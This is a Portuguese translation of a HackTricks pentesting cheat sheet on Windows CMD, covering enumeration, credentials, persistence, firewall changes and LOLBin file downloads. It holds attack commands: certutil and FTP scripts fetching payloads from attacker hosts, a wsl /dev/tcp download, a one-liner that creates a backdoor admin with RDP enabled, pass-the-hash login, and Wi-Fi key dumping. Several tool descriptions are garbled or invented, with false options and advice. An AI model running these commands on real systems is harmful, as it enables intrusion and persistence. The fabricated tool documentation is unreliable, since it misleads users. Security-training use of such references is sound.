## CMD B√°sico do Windows para Pentesters

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informa√ß√µes do sistema

### Informa√ß√µes de vers√£o e patches
```bash
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get architecture
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic computersystem LIST full #Get PC info

wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic qfe list brief #Updates

hostname

DRIVERQUERY #3rd party driver vulnerable?
```
### Ambiente
```bash
set #List all environment variables
```
Algumas vari√°veis de ambiente para destacar:

* **COMPUTERNAME**: Nome do computador
* **TEMP/TMP:** Pasta tempor√°ria
* **USERNAME:** Seu nome de usu√°rio
* **HOMEPATH/USERPROFILE:** Diret√≥rio pessoal
* **windir:** C:\Windows
* **OS**: Sistema operacional Windows
* **LOGONSERVER**: Nome do controlador de dom√≠nio
* **USERDNSDOMAIN**: Nome do dom√≠nio a ser usado com DNS
* **USERDOMAIN**: Nome do dom√≠nio.
```bash
nslookup %LOGONSERVER%.%USERDNSDOMAIN% #DNS request for DC
```
### Discos montados
```bash
(wmic logicaldisk get caption 2>nul | more) || (fsutil fsinfo drives 2>nul)
wmic logicaldisk get caption,description,providername
```
### [Defender](authentication-credentials-uac-and-efs.md#defender)

### Lixeira
```bash
dir C:\$Recycle.Bin /s /b
```
### Processos, Servi√ßos e Software
```bash
schtasks /query /fo LIST /v #Verbose out of scheduled tasks
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
tasklist /V #List processes
tasklist /SVC #links processes to started services
net start #Windows Services started
wmic service list brief #List services
sc query #List of services
dir /a "C:\Program Files" #Installed software
dir /a "C:\Program Files (x86)" #Installed software
reg query HKEY_LOCAL_MACHINE\SOFTWARE #Installed software
```
## Informa√ß√µes do Dom√≠nio
```bash
# Generic AD info
echo %USERDOMAIN% #Get domain name
echo %USERDNSDOMAIN% #Get domain name
echo %logonserver% #Get name of the domain controller
set logonserver #Get name of the domain controller
set log #Get name of the domain controller
gpresult /V # Get current policy applied
wmic ntdomain list /format:list	#Displays information about the Domain and Domain Controllers

# Users
dsquery user #Get all users
net user /domain #List all users of the domain
net user <ACCOUNT_NAME> /domain #Get information about that user
net accounts /domain #Password and lockout policy
wmic useraccount list /format:list #Displays information about all local accounts and any domain accounts that have logged into the device
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname #Get all users
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user where "ds_samaccountname='user_name'" GET # Get info of 1 users
wmic sysaccount list /format:list #¬†Dumps information about any system accounts that are being used as service accounts.

# Groups
net group /domain #List of domain groups
net localgroup administrators /domain #List uses that belongs to the administrators group inside the domain (the group "Domain Admins" is included here)
net group "Domain Admins" /domain #List users with domain admin privileges
net group "domain computers" /domain #List of PCs connected to the domain
net group "Domain Controllers" /domain #List PC accounts of domains controllers
wmic group list /format:list # Information about all local groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname #Get all groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value #Members of the group
wmic path win32_groupuser where (groupcomponent="win32_group.name="domain admins",domain="DOMAIN_NAME"") #Members of the group

# Computers
dsquery computer #Get all computers
net view /domain #Lis of PCs of the domain
nltest /dclist:<DOMAIN> #List domain controllers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname #All computers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname #All computers

# Trust relations
nltest /domain_trusts #Mapping of the trust relationships

# Get all objects inside an OU
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```
### Registros e Eventos
```bash
#Make a security query using another credentials
wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321
```
## Usu√°rios e Grupos

### Usu√°rios
```bash
#Me
whoami /all #All info about me, take a look at the enabled tokens
whoami /priv #Show only privileges

# Local users
net users #All users
dir /b /ad "C:\Users"
net user %username% #Info about a user (me)
net accounts #Information about password requirements
wmic USERACCOUNT Get Domain,Name,Sid
net user /add [username] [password] #Create user

# Other users looged
qwinsta #Anyone else logged in?

#Lauch new cmd.exe with new creds (to impersonate in network)
runas /netonly /user<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

#Check current logon session as administrator using logonsessions from sysinternals
logonsessions.exe
logonsessions64.exe
```
### Grupos
```bash
#Local
net localgroup #All available groups
net localgroup Administrators #Info about a group (admins)
net localgroup administrators [username] /add #Add user to administrators

#Domain
net group /domain #Info about domain groups
net group /domain <domain_group_name> #Users that belongs to the group
```
### Listar sess√µes
```
qwinsta
klist sessions
```
### Pol√≠tica de Senhas
```
net accounts
```
### Credenciais
```bash
cmdkey /list #List credential
vaultcmd /listcreds:"Windows Credentials" /all #List Windows vault
rundll32 keymgr.dll, KRShowKeyMgr #You need graphical access
```
### Persist√™ncia com usu√°rios
```bash
# Add domain user and put them in Domain Admins group
net user username password /ADD /DOMAIN
net group "Domain Admins" username /ADD /DOMAIN

# Add local user and put them local Administrators group
net user username password /ADD
net localgroup Administrators username /ADD

# Add user to insteresting groups:
net localgroup "Remote Desktop Users" UserLoginName  /add
net localgroup "Debugger users" UserLoginName /add
net localgroup "Power users" UserLoginName /add
```
## Rede

### Interfaces, Rotas, Portas, Hosts e Cache DNS
```bash
ipconfig /all #Info about interfaces
route print #Print available routes
arp -a #Know hosts
netstat -ano #Opened ports?
type C:\WINDOWS\System32\drivers\etc\hosts
ipconfig /displaydns | findstr "Record" | findstr "Name Host"
```
### Firewall

Um firewall √© um sistema de seguran√ßa que monitora e controla o tr√°fego de rede com base em regras de seguran√ßa. Ele pode ser implementado em hardware ou software e √© usado para proteger uma rede contra amea√ßas externas, como ataques de hackers e malware. O firewall pode ser configurado para permitir ou bloquear o tr√°fego com base em endere√ßos IP, portas e protocolos espec√≠ficos. √â uma medida de seguran√ßa essencial para qualquer rede.
```bash
netsh firewall show state # FW info, open ports
netsh advfirewall firewall show rule name=all
netsh firewall show config # FW info
Netsh Advfirewall show allprofiles

NetSh Advfirewall set allprofiles state off  #Turn Off
NetSh Advfirewall set allprofiles state on  #Trun On
netsh firewall set opmode disable #Turn Off

#How to open ports
netsh advfirewall firewall add rule name="NetBIOS UDP Port 138" dir=out action=allow protocol=UDP localport=138
netsh advfirewall firewall add rule name="NetBIOS TCP Port 139" dir=in action=allow protocol=TCP localport=139
netsh firewall add portopening TCP 3389 "Remote Desktop" 

#Enable Remote Desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
::netsh firewall set service remotedesktop enable #I found that this line is not needed
::sc config TermService start= auto #I found that this line is not needed
::net start Termservice #I found that this line is not needed

#Enable Remote Desktop with wmic
wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"
##or
wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"

#Enable Remote assistance:
reg add ‚ÄúHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server‚Äù /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service remoteadmin enable

#Ninja combo (New Admin User, RDP + Rassistance + Firewall allow)
net user hacker Hacker123! /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable

::Connect to RDP (using hash or password)
xfreerdp /u:alice /d:WORKGROUP /pth:b74242f37e47371aff835a6ebcac4ffe /v:10.11.1.49
xfreerdp /u:hacker /d:WORKGROUP /p:Hacker123! /v:10.11.1.49
```
### Compartilhamentos
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### Wifi
```bash
netsh wlan show profile #AP SSID
netsh wlan show profile <SSID> key=clear #Get Cleartext Pass
```
### SNMP

SNMP (Simple Network Management Protocol) √© um protocolo padr√£o para gerenciamento de dispositivos em redes IP. Ele permite que os administradores monitorem e gerenciem dispositivos de rede, como roteadores, switches, servidores e impressoras, entre outros. O SNMP funciona atrav√©s de mensagens enviadas entre dispositivos de rede e um software de gerenciamento de rede centralizado. As mensagens cont√™m informa√ß√µes sobre o status do dispositivo, como uso de CPU, uso de mem√≥ria e tr√°fego de rede. Os pentesters podem usar o SNMP para obter informa√ß√µes sobre dispositivos de rede e explorar vulnerabilidades.
```
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
```
### Interfaces de Rede
```bash
ipconfig /all
```
### Tabela ARP
```bash
arp -A
```
## Download

Bitsadmin.exe
```
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1
```
CertReq.exe √© uma ferramenta de linha de comando que √© usada para solicitar e emitir certificados digitais em um ambiente Windows. Ele pode ser usado para criar solicita√ß√µes de certificado, enviar solicita√ß√µes para uma autoridade de certifica√ß√£o e instalar certificados emitidos. Essa ferramenta √© √∫til para pentesters que desejam obter certificados para fins de autentica√ß√£o ou para realizar ataques de phishing.
```
CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt
```
Certutil.exe √© uma ferramenta de linha de comando do Windows que √© usada para gerenciar certificados digitais. Ele pode ser usado para instalar, gerenciar e revogar certificados, bem como para exibir informa√ß√µes sobre eles. Al√©m disso, o Certutil.exe tamb√©m pode ser usado para codificar e decodificar arquivos, bem como para verificar a assinatura digital de arquivos. Essa ferramenta √© frequentemente usada por pentesters para verificar se um certificado digital √© v√°lido e se ele foi emitido por uma autoridade de certifica√ß√£o confi√°vel.
```
certutil.exe -urlcache -split -f "http://10.10.14.13:8000/shell.exe" s.exe
```
# Desktopimgdownldr.exe

O arquivo `Desktopimgdownldr.exe` √© um execut√°vel que pode ser usado para baixar imagens de desktops remotos. Esse arquivo pode ser usado por atacantes para baixar imagens de desktops de v√≠timas infectadas com malware.

Se voc√™ encontrar esse arquivo em seu sistema, √© altamente recomend√°vel remov√™-lo imediatamente e executar uma verifica√ß√£o completa do sistema com um software antiv√≠rus confi√°vel. Al√©m disso, √© importante garantir que seu sistema esteja sempre atualizado com as √∫ltimas atualiza√ß√µes de seguran√ßa para evitar vulnerabilidades conhecidas que possam ser exploradas por atacantes.
```
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr
```
Diantz.exe √© uma ferramenta de linha de comando que permite compactar e descompactar arquivos .cab. √â √∫til para reduzir o tamanho de arquivos e economizar espa√ßo em disco. Para compactar um arquivo, use o seguinte comando:

```
diantz.exe -c <arquivo de entrada> <arquivo de sa√≠da>
```

Para descompactar um arquivo, use o seguinte comando:

```
diantz.exe -d <arquivo de entrada> <arquivo de sa√≠da>
```

Voc√™ tamb√©m pode usar a op√ß√£o `-v` para exibir informa√ß√µes detalhadas sobre o processo de compacta√ß√£o ou descompacta√ß√£o.
```
diantz.exe \\remotemachine\pathToFile\file.exe c:\destinationFolder\file.cab
```
O comando `esentutl.exe` √© uma ferramenta de linha de comando que permite gerenciar bancos de dados do Microsoft Extensible Storage Engine (ESE). Essa ferramenta pode ser usada para verificar a integridade do banco de dados, reparar arquivos corrompidos, compactar bancos de dados grandes e muito mais. √â uma ferramenta √∫til para pentesters que desejam explorar vulnerabilidades em bancos de dados ESE.
```
esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o
```
# Expand.exe

O comando `expand.exe` √© usado para descompactar arquivos `.cab`. Ele √© √∫til para extrair arquivos de instala√ß√£o de programas que est√£o compactados em um arquivo `.cab`. 

## Sintaxe

```
expand.exe [-r] arquivo.cab [destino]
```

## Par√¢metros

* `-r`: Extrai todos os arquivos e subpastas de forma recursiva.
* `arquivo.cab`: Especifica o arquivo `.cab` que ser√° descompactado.
* `destino`: Especifica o diret√≥rio de destino para os arquivos descompactados. Se n√£o for especificado, os arquivos ser√£o extra√≠dos para o diret√≥rio atual.

## Exemplo

```
expand.exe -r programa.cab C:\Programas
```

Este comando extrai todos os arquivos e subpastas do arquivo `programa.cab` para o diret√≥rio `C:\Programas`.
```
expand \\webdav\folder\file.bat c:\ADS\file.bat
```
Extrac32.exe √© uma ferramenta de linha de comando do Windows que permite extrair arquivos de um arquivo compactado no formato .cab. √â poss√≠vel us√°-lo para extrair arquivos de um arquivo .cab malicioso que pode ter sido baixado ou recebido por e-mail. √â importante lembrar que arquivos .cab tamb√©m podem ser usados para distribuir malware, portanto, √© importante ter cuidado ao extrair arquivos de um arquivo .cab desconhecido.
```
extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt
```
# Findstr.exe

O comando `findstr` √© usado para pesquisar por strings em arquivos de texto. √â uma ferramenta muito √∫til para encontrar informa√ß√µes espec√≠ficas em arquivos de log ou em outros arquivos de texto.

## Sintaxe

```
findstr [op√ß√µes] string [arquivos]
```

## Op√ß√µes

Algumas das op√ß√µes mais √∫teis do `findstr` s√£o:

- `/i`: Ignora mai√∫sculas e min√∫sculas.
- `/s`: Pesquisa em subdiret√≥rios.
- `/n`: Mostra o n√∫mero da linha em que a string foi encontrada.
- `/c`: Conta o n√∫mero de ocorr√™ncias da string em vez de mostrar as linhas em que ela foi encontrada.

## Exemplos

Pesquisar por uma string em um arquivo:

```
findstr "string" arquivo.txt
```

Pesquisar por uma string em v√°rios arquivos:

```
findstr "string" *.txt
```

Pesquisar por uma string em todos os arquivos de um diret√≥rio e seus subdiret√≥rios:

```
findstr /s "string" *
```

Pesquisar por uma string em um arquivo e mostrar o n√∫mero da linha em que ela foi encontrada:

```
findstr /n "string" arquivo.txt
```

Pesquisar por uma string em um arquivo e contar o n√∫mero de ocorr√™ncias:

```
findstr /c "string" arquivo.txt
```
```
findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.exe
```
# Ftp.exe

O comando `ftp.exe` √© uma ferramenta de linha de comando que permite a transfer√™ncia de arquivos entre sistemas atrav√©s do protocolo FTP (File Transfer Protocol). √â uma ferramenta √∫til para testar a conectividade e a autentica√ß√£o do servidor FTP.

## Sintaxe

```
ftp [-v] [-d] [-i] [-n] [-g] [-s:filename] [-a] [-w:windowsize] [-A] [host]
```

## Op√ß√µes

- `-v`: Ativa o modo verbose, exibindo informa√ß√µes detalhadas sobre a transfer√™ncia de arquivos.
- `-d`: Ativa o modo de depura√ß√£o, exibindo informa√ß√µes adicionais para fins de depura√ß√£o.
- `-i`: Desativa a confirma√ß√£o de prompt para transfer√™ncias de arquivos em lote.
- `-n`: Desativa a exibi√ß√£o autom√°tica do prompt FTP.
- `-g`: Ativa o modo de transfer√™ncia de arquivos bin√°rios.
- `-s:filename`: Especifica um arquivo de script contendo comandos FTP.
- `-a`: Ativa o modo de transfer√™ncia de arquivos ASCII.
- `-w:windowsize`: Especifica o tamanho da janela de transfer√™ncia.
- `-A`: Ativa o modo de autentica√ß√£o an√¥nima.

## Exemplos

Conectar-se a um servidor FTP:

```
ftp ftp.example.com
```

Fazer login com nome de usu√°rio e senha:

```
ftp ftp.example.com
Name: username
Password: ********
```

Transferir um arquivo do servidor FTP para o computador local:

```
ftp ftp.example.com
Name: username
Password: ********
ftp> get example.txt
```

Transferir um arquivo do computador local para o servidor FTP:

```
ftp ftp.example.com
Name: username
Password: ********
ftp> put example.txt
```

Sair do FTP:

```
ftp> quit
```
```
cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
```
# GfxDownloadWrapper.exe

O arquivo `GfxDownloadWrapper.exe` √© um execut√°vel que faz parte do software de gr√°ficos da Intel. No entanto, ele tamb√©m pode ser usado como um vetor de ataque por invasores mal-intencionados.

Os invasores podem usar o `GfxDownloadWrapper.exe` para executar comandos maliciosos no sistema comprometido. Eles podem fazer isso substituindo o arquivo original por uma vers√£o maliciosa ou explorando vulnerabilidades no software de gr√°ficos da Intel.

Para evitar poss√≠veis ataques, √© recomend√°vel manter o software de gr√°ficos da Intel atualizado e verificar regularmente a integridade do arquivo `GfxDownloadWrapper.exe`. Al√©m disso, √© importante ter um software antiv√≠rus atualizado e em execu√ß√£o no sistema.
```
C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe "URL" "DESTINATION FILE"
```
Hh.exe √© um execut√°vel do Windows que √© usado para exibir arquivos de ajuda (.chm) e seus conte√∫dos. Ele pode ser usado para exibir a ajuda de um programa ou para abrir um arquivo .chm diretamente. Al√©m disso, o hh.exe pode ser usado para executar comandos do sistema operacional, como abrir um arquivo ou executar um programa. √â importante notar que o hh.exe pode ser usado por atacantes para executar comandos maliciosos no sistema. Portanto, √© importante monitorar o uso do hh.exe e restringir o acesso a ele sempre que poss√≠vel.
```
HH.exe http://some.url/script.ps1
```
# ieexec.exe

O comando `ieexec.exe` √© um utilit√°rio do Windows que permite executar comandos em um navegador Internet Explorer. Isso pode ser √∫til para testar vulnerabilidades em sites que s√≥ funcionam no IE ou para automatizar tarefas que envolvem o uso do navegador.

## Sintaxe

```
ieexec.exe [-url <URL>] [-post <dados>] [-get <dados>] [-cookie <dados>] [-header <dados>] [-timeout <segundos>] [-hide] [-debug] [-help]
```

## Op√ß√µes

- `-url <URL>`: Especifica a URL a ser carregada no navegador.
- `-post <dados>`: Especifica os dados a serem enviados em uma solicita√ß√£o POST.
- `-get <dados>`: Especifica os dados a serem enviados em uma solicita√ß√£o GET.
- `-cookie <dados>`: Especifica os cookies a serem enviados com a solicita√ß√£o.
- `-header <dados>`: Especifica os cabe√ßalhos a serem enviados com a solicita√ß√£o.
- `-timeout <segundos>`: Especifica o tempo limite em segundos para a solicita√ß√£o.
- `-hide`: Executa o navegador em segundo plano, sem exibir a interface do usu√°rio.
- `-debug`: Exibe informa√ß√µes de depura√ß√£o.
- `-help`: Exibe a ajuda.

## Exemplos

- Abrir o Internet Explorer e carregar uma p√°gina:

```
ieexec.exe -url http://www.exemplo.com
```

- Enviar uma solicita√ß√£o POST:

```
ieexec.exe -url http://www.exemplo.com -post "usuario=admin&senha=123456"
```

- Enviar uma solicita√ß√£o GET com cookies:

```
ieexec.exe -url http://www.exemplo.com -get "pagina=perfil" -cookie "sessionid=123456"
```
```
ieexec.exe http://x.x.x.x:8080/bypass.exe
```
# Makecab.exe

`Makecab.exe` √© uma ferramenta do Windows que permite compactar arquivos em um √∫nico arquivo `.cab`. Isso pode ser √∫til para reduzir o tamanho de arquivos que precisam ser transferidos ou armazenados.

## Sintaxe

```
makecab [/V[n]] [/D var=value ...] [/L dir] [/F directive_file] source [destination]
```

## Op√ß√µes

- `/V[n]`: Define o n√≠vel de verbosidade (0-3) para a sa√≠da.
- `/D var=value`: Define uma vari√°vel de ambiente para ser usada durante a compacta√ß√£o.
- `/L dir`: Define o diret√≥rio de sa√≠da para os arquivos gerados.
- `/F directive_file`: Especifica um arquivo de diretiva que cont√©m instru√ß√µes adicionais para a compacta√ß√£o.
- `source`: Especifica o arquivo ou diret√≥rio de origem para a compacta√ß√£o.
- `destination`: Especifica o nome e localiza√ß√£o do arquivo compactado resultante. Se n√£o for especificado, o arquivo ser√° criado no diret√≥rio atual com o mesmo nome da origem, mas com a extens√£o `.cab`.

## Exemplo

Compactar um arquivo:

```
makecab arquivo.txt
```

Compactar um diret√≥rio:

```
makecab diretorio
```

Compactar um arquivo com um nome espec√≠fico:

```
makecab arquivo.txt arquivo.cab
```
```
makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab
```
`MpCmdRun.exe` √© um utilit√°rio de linha de comando usado para gerenciar o Windows Defender no Windows. Ele pode ser usado para verificar o sistema em busca de malware, atualizar defini√ß√µes de v√≠rus, executar verifica√ß√µes agendadas e muito mais. √â uma ferramenta √∫til para pentesters que desejam verificar se o Windows Defender est√° ativado e atualizado em um sistema alvo.
```
MpCmdRun.exe -DownloadFile -url <URL> -path <path> //Windows Defender executable
```
# Replace.exe

O comando `replace.exe` √© usado para substituir arquivos. √â √∫til para substituir arquivos de sistema que n√£o podem ser substitu√≠dos de outra forma.

## Sintaxe

```
replace.exe <arquivo_original> <arquivo_novo> [/A] [/R] [/S] [/U] [/P] [/W]
```

## Op√ß√µes

- `/A`: Acrescenta o arquivo novo ao arquivo original.
- `/R`: Substitui somente os arquivos que s√£o mais recentes que o arquivo original.
- `/S`: Substitui arquivos em subdiret√≥rios.
- `/U`: Substitui somente os arquivos que s√£o mais antigos que o arquivo original.
- `/P`: Pede confirma√ß√£o antes de substituir cada arquivo.
- `/W`: Espera que o usu√°rio pressione uma tecla antes de substituir cada arquivo.

## Exemplo

```
replace.exe c:\windows\system32\calc.exe c:\temp\calc.exe /S
```

Este comando substitui o arquivo `calc.exe` em `c:\windows\system32` pelo arquivo `calc.exe` em `c:\temp`, incluindo subdiret√≥rios.
```
replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A
```
# Excel.exe

O `excel.exe` √© o processo do Microsoft Excel. Ele √© respons√°vel por executar o aplicativo do Excel e abrir arquivos do Excel. √â poss√≠vel executar o `excel.exe` a partir do prompt de comando para abrir um arquivo do Excel espec√≠fico ou para executar uma macro do Excel. 

## Comandos √∫teis

### Executar o Excel a partir do prompt de comando

```
excel.exe
```

### Abrir um arquivo do Excel a partir do prompt de comando

```
excel.exe "C:\caminho\para\arquivo.xlsx"
```

### Executar uma macro do Excel a partir do prompt de comando

```
excel.exe /mNomeDaMacro
```

### Executar o Excel em modo de seguran√ßa

```
excel.exe /safe
```

### Executar o Excel sem a inicializa√ß√£o de complementos

```
excel.exe /s
```

### Exibir a vers√£o do Excel

```
excel.exe /version
```
```
Excel.exe http://192.168.1.10/TeamsAddinLoader.dll
```
Powerpnt.exe √© o execut√°vel do Microsoft PowerPoint, um software de apresenta√ß√£o desenvolvido pela Microsoft.
```
Powerpnt.exe "http://192.168.1.10/TeamsAddinLoader.dll"
```
Squirrel.exe √© uma ferramenta de linha de comando que permite a instala√ß√£o, atualiza√ß√£o e desinstala√ß√£o de aplicativos Windows. Ele √© frequentemente usado em conjunto com o framework de atualiza√ß√£o autom√°tica Squirrel, que permite que os aplicativos sejam atualizados automaticamente quando uma nova vers√£o √© lan√ßada. Os pentesters podem usar o Squirrel.exe para verificar se h√° vulnerabilidades de seguran√ßa no processo de atualiza√ß√£o autom√°tica de um aplicativo.
```
squirrel.exe --download [url to package]
```
# Update.exe

O arquivo `update.exe` √© um execut√°vel do Windows que √© frequentemente usado para atualizar software. No entanto, tamb√©m pode ser usado por atacantes para executar comandos maliciosos no sistema. √â importante verificar a localiza√ß√£o do arquivo `update.exe` e garantir que ele seja leg√≠timo antes de execut√°-lo.

## Verificando a localiza√ß√£o do arquivo

Para verificar a localiza√ß√£o do arquivo `update.exe`, voc√™ pode usar o seguinte comando:

```
where.exe update.exe
```

Isso mostrar√° a localiza√ß√£o do arquivo `update.exe` no sistema.

## Verificando a assinatura digital

Para verificar se o arquivo `update.exe` √© leg√≠timo, voc√™ pode verificar sua assinatura digital. Para fazer isso, use o seguinte comando:

```
sigcheck.exe -a -v update.exe
```

Isso mostrar√° informa√ß√µes sobre a assinatura digital do arquivo `update.exe`. Verifique se a assinatura √© v√°lida e se o nome do editor √© leg√≠timo.

## Conclus√£o

O arquivo `update.exe` pode ser usado para atualizar software, mas tamb√©m pode ser usado por atacantes para executar comandos maliciosos. Verifique a localiza√ß√£o do arquivo e a assinatura digital antes de execut√°-lo.
```
Update.exe --download [url to package]
```
Winword.exe √© o processo do Microsoft Word, um processador de texto amplamente utilizado. √â importante estar ciente desse processo ao realizar an√°lises de malware, pois alguns malwares podem se disfar√ßar como o processo Winword.exe para evitar detec√ß√£o.
```
winword.exe "http://192.168.1.10/TeamsAddinLoader.dll"
```
# Wsl.exe

O comando `wsl.exe` √© usado para gerenciar distribui√ß√µes do Windows Subsystem for Linux (WSL) no Windows 10. Ele pode ser usado para executar comandos em uma distribui√ß√£o espec√≠fica, definir a distribui√ß√£o padr√£o e muito mais.

## Sintaxe

```
wsl.exe [comando] [op√ß√µes]
```

## Comandos

- `--list` ou `-l`: lista todas as distribui√ß√µes WSL instaladas.
- `--set-default <Distro>`: define a distribui√ß√£o padr√£o para ser usada quando `wsl` √© executado sem argumentos.
- `--set-version <Distro> <Vers√£o>`: define a vers√£o do WSL para uma distribui√ß√£o espec√≠fica.
- `--terminate <Distro>`: encerra todas as inst√¢ncias em execu√ß√£o da distribui√ß√£o especificada.
- `--shutdown`: encerra todas as distribui√ß√µes WSL em execu√ß√£o.

## Exemplos

- Listar todas as distribui√ß√µes WSL instaladas:

```
wsl.exe --list
```

- Definir a distribui√ß√£o padr√£o para Ubuntu:

```
wsl.exe --set-default Ubuntu
```

- Definir a vers√£o 2 do WSL para a distribui√ß√£o Ubuntu:

```
wsl.exe --set-version Ubuntu 2
```

- Encerrar todas as inst√¢ncias em execu√ß√£o da distribui√ß√£o Ubuntu:

```
wsl.exe --terminate Ubuntu
```

- Encerrar todas as distribui√ß√µes WSL em execu√ß√£o:

```
wsl.exe --shutdown
```
```
wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
```
## Miscel√¢nea
```bash
cd #Get current dir
cd C:\path\to\dir #Change dir
dir #List current dir
dir /a:h C:\path\to\dir #List hidden files
dir /s /b #Recursive list without shit
time #Get current time
date #Get current date
shutdown /r /t 0 #Shutdown now
type <file> #Cat file

#Runas
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe" #Use saved credentials
runas /netonly /user:<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

#Hide
attrib +h file #Set Hidden
attrib -h file #Quit Hidden

#Give full control over a file that you owns
icacls <FILE_PATH> /t /e /p <USERNAME>:F
icacls <FILE_PATH> /e /r <USERNAME> #Remove the permision

#Recursive copy to smb
xcopy /hievry C:\Users\security\.yawcam \\10.10.14.13\name\win

#exe2bat to transform exe file in bat file

#ADS
dir /r #Detect ADS
more file.txt:ads.txt #read ADS
powershell (Get-Content file.txt -Stream ads.txt)

# Get error messages from code
net helpmsg 32 #32 is the code in that case
```
### Contornando a Restri√ß√£o de Caracteres
```bash
echo %HOMEPATH:~6,-11%   #\
who^ami   #whoami
```
### DOSfuscation

Gera uma linha de comando CMD ofuscada.
```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
help
SET COMMAND type C:\Users\Administrator\Desktop\flag.txt
encoding
```
### ACLs de endere√ßo de escuta

Voc√™ pode escutar em [http://+:80/Temporary\_Listen\_Addresses/](http://+/Temporary\_Listen\_Addresses/) sem ser administrador.
```bash
netsh http show urlacl
```
### Shell DNS manual

**Atacante** (Kali) deve usar uma dessas 2 op√ß√µes:
```bash
sudo responder -I <iface> #Active
sudo tcpdump -i <iface> -A proto udp and dst port 53 and dst ip <KALI_IP> #Passive
```
#### V√≠tima

_**for /f tokens**_ \_\*\*\_t√©cnica: Isso nos permite executar comandos, obter as primeiras X palavras de cada linha e envi√°-las atrav√©s do DNS para nosso servidor.
```
